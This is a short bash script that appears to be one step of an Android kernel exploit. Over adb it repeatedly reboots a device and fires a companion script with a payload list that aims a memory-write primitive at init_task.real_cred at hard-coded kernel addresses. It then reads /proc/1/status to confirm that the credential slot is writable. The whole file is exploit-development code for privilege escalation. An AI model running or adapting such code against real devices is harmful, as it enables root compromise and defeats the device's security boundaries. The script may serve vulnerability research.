#!/usr/bin/env bash
# Aim the free second store at init_task.real_cred (= 0xc1a118dc).
# The store writes  (write_target - 4) = write_value, so target = 0xc1a118e0.
# write_value must itself be writable: use a .bss scratch word of our own.
# ORACLE: /proc/1/status must start answering with init_cred's own bytes --
# uid/gid 0 stays but CapPrm/CapEff/CapBnd go to 0 (the reader is now one dword
# off the real cred). If it does not move, the init_task page is read-only.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
cd "$(dirname "$0")" || exit 1
P="c1a118e0=c1d51600"; for i in $(seq 2 14); do P="$P,c1a118e0=c1d51600"; done
P="$P,@c1a118e0=c1d51600"
for r in 1 2 3; do
  $ADB reboot >/dev/null 2>&1; sleep 110
  for i in 1 2 3 4 5 6; do
    [ "$($ADB shell getprop sys.boot_completed 2>/dev/null|tr -d '\r')" = "1" ] && break
    sleep 8
  done
  bash atd_fire.sh "rc$r" GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=st \
    GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=16 GHOSTLOCK_STAT_PLIST="$P" >/dev/null 2>&1
  echo "--- round $r: WS-DONE=$(grep -acE 'WS-DONE' captures/rc$r.log)"
  $ADB shell "sed -n '9,11p;30,31p;36,40p' /proc/1/status" 2>/dev/null | tr -d '\r'
  case "$($ADB shell sed -n 36,38p /proc/1/status 2>/dev/null | tr -d '\r')" in
    *0000000000000000*CapPrm*|*CapPrm:*0000000000*)
      echo "RESULT: reader moved -> real_cred slot IS writable"; exit 0 ;;
  esac
done
echo "RESULT: reader never moved"
exit 1
